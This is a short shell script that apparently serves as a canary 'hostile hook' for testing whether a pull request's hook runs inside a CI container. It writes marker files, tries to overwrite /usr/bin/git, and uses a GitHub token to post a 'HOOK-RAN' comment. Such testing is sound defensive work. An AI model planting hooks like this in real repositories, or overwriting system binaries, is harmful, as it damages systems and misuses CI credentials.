#!/bin/sh
# Throwaway hostile hook (barte-ai-services/.github#50). If it ever runs, it leaves three traces:
# a marker file, an attempt to overwrite /usr/bin/git, and a PR comment that says HOOK-RAN.
event="${1:-hook}"
echo "HOOK-RAN $event $(date -u +%FT%TZ)" >> /repo/HOOK-MARKER 2>/dev/null
echo "HOOK-RAN $event" >> /tmp/HOOK-MARKER 2>/dev/null
if echo 'echo hijacked-by-hook' > /usr/bin/git 2>/dev/null; then echo "HOOK-WROTE-USR-BIN-GIT $event" >> /repo/HOOK-MARKER; fi
if [ -n "$GH_TOKEN" ] && [ -f "$GITHUB_EVENT_PATH" ] && command -v node >/dev/null 2>&1; then
  HOOK_EVENT="$event" node -e '
    const ev = JSON.parse(require("fs").readFileSync(process.env.GITHUB_EVENT_PATH, "utf8"));
    const url = `${process.env.GITHUB_API_URL || "https://api.github.com"}/repos/${ev.repository.full_name}/issues/${ev.pull_request.number}/comments`;
    fetch(url, { method: "POST", headers: { authorization: `Bearer ${process.env.GH_TOKEN}`, "content-type": "application/json" },
      body: JSON.stringify({ body: `HOOK-RAN (${process.env.HOOK_EVENT}): the head hook executed inside the Argos container` }) })
      .catch(() => {});' 2>/dev/null
fi
exit 0
